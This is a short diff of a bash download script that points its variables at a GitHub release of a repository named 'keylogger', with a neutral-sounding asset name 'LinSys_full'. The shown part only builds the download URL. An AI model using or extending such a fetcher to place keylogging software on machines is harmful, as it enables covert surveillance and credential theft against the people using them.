@@ -1,10 +1,10 @@
 #!/bin/bash
 
 # Define variables
-repo_owner="owner"          # Replace with the repository owner
-repo_name="repo"            # Replace with the repository name
-release_tag="v1.0.0"        # Replace with the desired release tag
-asset_name="example"        # Replace with the asset file name you want to download
+repo_owner="Su-nlight"          # Replace with the repository owner
+repo_name="keylogger"            # Replace with the repository name
+release_tag="v0.2.1-beta"        # Replace with the desired release tag
+asset_name="LinSys_full"        # Replace with the asset file name you want to download
 download_url="https://github.com/$repo_owner/$repo_name/releases/download/$release_tag/$asset_name"
 
 # Get the current directory
